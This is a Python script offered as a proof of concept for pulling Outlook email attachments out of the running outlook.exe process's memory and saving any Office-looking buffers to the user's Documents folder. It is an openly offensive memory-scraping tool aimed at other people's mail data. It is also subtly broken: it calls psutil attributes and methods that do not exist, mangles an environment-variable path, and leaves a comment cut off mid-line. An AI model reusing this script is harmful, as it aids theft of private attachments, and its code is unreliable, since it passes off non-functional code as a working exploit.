import os
import psutil
import win32com.client
import win32api
import win32process
import win32com
import win32con
from magic import Magic
import time

# objective: proof-of-concept of a possible vulnerability in a Microsoft Outlook add-in which saves attachments to a byte-array, allowing an attacker to extract them from memory.

#this purports to extract such files from the byte array in volatile memory and save them to disk just to show how this could be done

## the 

global hasRun 
hasRun = False
outlook = win32com.client.Dispatch("Outlook.Application")

file_exts = {
    'docx': ['Microsoft Word 2007+', 'Composite Document File V2 Document, Little Endian, Os: Windows, Version 6.1'],
    'pptx': ['Microsoft PowerPoint 2007+', 'PowerPoint 97-2003'],
    'xlsx': ['Microsoft Office 2007+', 'Composite Document File V2 Document, Little Endian, Os: Windows, Version 6.0', 'Composite Document File V2 Document, Little Endian, Os: Windows, Version 6.1'],
    # add more file types and their corresponding magic numbers here
}


def check_for_outlook():
    global hasRun
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            if proc.name().lower() == 'outlook.exe':
                pid = proc.pid
                read_process(pid)
                hasRun = True
        except (psutil.AccessDenied, psutil.NoSuchProcess):
            print("OK, not reading process")
            pass


def read_process(pid):
    # Get the process handle
    try:
        process = psutil.Process(pid)
        handle = process.as_dict(attrs=['pid', 'name', 'ppid', 'status', 'username'])['pid']
    except psutil.NoSuchProcess:
        print(f'Process {pid} not found')
        return

    # Iterate over the memory regions to find the Outlook data
    for region in process.memory_maps():
        if region.is_rwx:
            try:
                data = region.read()
            except (psutil.AccessDenied, psutil.ZombieProcess):
                print("Access denied by system")
                continue

            # It checks if the data is an Office file and saves it in the Documents folder. I intend to open a Save As... window soon.
            magic_number = Magic()
            file_type = magic_number.from_buffer(data[:1024])
            for ext, magic_nums in file_exts.items():
                if file_type in magic_nums:
                    output_file_name = f"{pid}.{ext}"
                    with open(os.path.expandvars(f"%USERPROFILE\\Documents\\{output_file_name}"), "wb") as export_file:
                        export_file.write(data)
                    print(f"Extraction successful: {output_file_name}")
                    break


def main():
    
    while not hasRun:
        check_for_outlook()
        time.sleep(10)
    
           



if __name__ == "__main__":
    main()
